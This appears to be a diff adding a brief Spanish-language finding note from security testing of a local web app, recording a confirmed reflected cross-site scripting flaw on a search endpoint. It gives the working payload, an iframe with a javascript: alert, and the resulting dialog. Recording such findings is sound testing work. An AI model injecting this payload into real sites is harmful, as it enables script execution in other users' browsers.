@@ -1,0 +1,20 @@
+Vulnerabilidad:
+Cross-Site Scripting (Reflected XSS)
+
+Endpoint:
+
+http://127.0.0.1:3000/#/search
+
+Payload:
+
+<iframe src="javascript:alert(`XSS`)">
+
+Resultado:
+
+Se ejecutó JavaScript en el navegador mostrando un cuadro de diálogo con el texto:
+
+XSS
+
+Estado:
+
+Confirmada
